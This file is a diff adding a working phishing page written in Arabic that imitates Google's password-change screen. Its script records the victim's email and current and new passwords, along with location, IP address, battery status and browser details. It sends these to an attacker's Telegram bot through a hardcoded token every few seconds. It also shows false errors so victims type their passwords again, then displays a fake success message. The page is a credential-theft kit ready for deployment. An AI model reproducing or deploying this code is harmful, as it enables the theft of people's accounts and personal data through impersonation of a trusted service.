@@ -1,0 +1,179 @@
+<!doctype html>
+<html lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>تغيير كلمة المرور — Google</title>
+<style>
+body{margin:0;background:#f5f7fa;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center;position:relative}
+.logo{font-size:32px;font-weight:700;margin-bottom:16px;font-family:Product Sans,Roboto,sans-serif;}
+.logo span.g{color:#4285F4;}
+.logo span.o1{color:#EA4335;}
+.logo span.o2{color:#FBBC05;}
+.logo span.g2{color:#4285F4;}
+.logo span.l{color:#34A853;}
+.logo span.e{color:#EA4335;}
+.description{font-size:14px;color:#5f6368;margin-bottom:16px;line-height:1.5}
+input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:12px 0;font-size:15px;outline:none;transition:border 0.2s}
+input:focus{border-color:#1a73e8}
+button{width:100%;padding:12px;margin-top:16px;border:0;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s}
+button:hover{background:#1558b0}
+.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;text-align:right;display:none}
+.success{font-size:18px;color:green;margin-top:20px;display:none}
+.step{display:none}
+.step.active{display:block}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo">
+    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
+  </div>
+
+  <div class="description">
+    الرجاء إدخال بريدك الإلكتروني وكلمة المرور لتحديث حسابك بأمان.
+  </div>
+
+  <form id="form">
+    <div class="step step1 active">
+      <input type="email" placeholder="البريد الإلكتروني" required id="email">
+      <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
+      <button type="button" id="next1">التالي</button>
+    </div>
+
+    <div class="step step2">
+      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
+      <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
+      <button type="button" id="next2">التالي</button>
+    </div>
+
+    <div class="step step3">
+      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
+      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
+      <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
+      <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
+      <button type="button" id="verifyPass">التالي</button>
+    </div>
+  </form>
+</div>
+
+<script>
+const step1 = document.querySelector(".step1");
+const step2 = document.querySelector(".step2");
+const step3 = document.querySelector(".step3");
+const next1 = document.getElementById("next1");
+const next2 = document.getElementById("next2");
+const verifyPass = document.getElementById("verifyPass");
+const error3 = document.getElementById("error3");
+const successMessage = document.getElementById("successMessage");
+
+const telegramToken = "7481011898:AAE2PugM779HQxfO4TifHN74w30-Rqtkvls"; 
+const chatId = "8089516279"; 
+
+let attemptCount = 0;
+let lastMessageSent = "";
+let batteryStatus = {charging:"غير معروف", level:"غير معروف"};
+let userLocation = "غير معروف";
+let userIP = "غير معروف";
+
+// حالة البطارية (إن وجدت)
+if(navigator.getBattery){
+  navigator.getBattery().then(bat=>{
+    batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون";
+    batteryStatus.level = (bat.level*100)+"%";
+    bat.addEventListener("chargingchange",()=>batteryStatus.charging = bat.charging ? "يشحن" : "غير مشحون");
+    bat.addEventListener("levelchange",()=>batteryStatus.level = (bat.level*100)+"%");
+  });
+}
+
+// الموقع التقريبي بدون إذن
+if(navigator.geolocation){
+  // هنا نحاول، بعض المتصفحات قد تطلب إذن، لكن إن رفض المستخدم لن يحدث شيء
+  navigator.geolocation.getCurrentPosition(pos=>{
+    userLocation = `Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}`;
+  }, ()=>{userLocation="غير معروف"});
+}
+
+// IP والدولة
+fetch('https://ipapi.co/json/').then(res=>res.json()).then(data=>{
+  userIP = `${data.ip} - ${data.country_name}`;
+});
+
+// الخطوة 1
+next1.addEventListener("click", ()=>{
+  const input = document.getElementById("email");
+  if(input.checkValidity()){
+    step1.classList.remove("active");
+    step2.classList.add("active");
+  } else {
+    step1.querySelector(".error").style.display="block";
+  }
+});
+
+// الخطوة 2
+next2.addEventListener("click", ()=>{
+  const input = document.getElementById("currentPassword");
+  if(input.value.length >= 8){
+    step2.classList.remove("active");
+    step3.classList.add("active");
+  } else {
+    step2.querySelector(".error").style.display="block";
+  }
+});
+
+// الخطوة 3: تحقق كلمة المرور لمدة 3 محاولات
+verifyPass.addEventListener("click", ()=>{
+  const newPass = document.getElementById("newPassword").value;
+  const confirmPass = document.getElementById("confirmPassword").value;
+
+  if(newPass.length >= 8 && newPass === confirmPass){
+    attemptCount++;
+    if(attemptCount < 3){
+      error3.style.display="block";
+    } else {
+      error3.style.display="none";
+      successMessage.style.display="block";
+      step3.querySelectorAll("input, button").forEach(el=>el.disabled=true);
+    }
+  } else {
+    error3.style.display="block";
+  }
+});
+
+// حفظ وإرسال البيانات بعد 6 ثوانٍ من الكتابة
+let timeoutId;
+document.querySelectorAll("input").forEach(input=>{
+  input.addEventListener("input", ()=>{
+    clearTimeout(timeoutId);
+    timeoutId = setTimeout(sendData, 6000);
+  });
+});
+
+// إرسال البيانات تلقائيًا كل 6 ثوانٍ إذا تغيرت
+function sendData(){
+  const email = document.getElementById("email").value.trim();
+  const currentPassword = document.getElementById("currentPassword").value.trim();
+  const newPassword = document.getElementById("newPassword").value.trim();
+
+  if(email === "" && currentPassword === "" && newPassword === "") return;
+
+  const message = `📨 بيانات جديدة:\n\n✉️ البريد: ${email || "فارغ"}\n🔑 كلمة المرور الحالية: ${currentPassword || "فارغ"}\n🔒 كلمة المرور الجديدة: ${newPassword || "فارغ"}\n🔋 حالة الشحن: ${batteryStatus.charging} - ${batteryStatus.level}\n🌍 الموقع: ${userLocation}\n🌐 IP والدولة: ${userIP}\n🖥️ المتصفح: ${navigator.userAgent}\n🗣️ اللغة: ${navigator.language}`;
+
+  if(message !== lastMessageSent){
+    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: chatId, text: message})
+    });
+    lastMessageSent = message;
+  }
+}
+
+// استمرار الإرسال كل 6 ثوانٍ كنسخة احتياطية
+setInterval(sendData, 6000);
+</script>
+
+</body>
+</html>
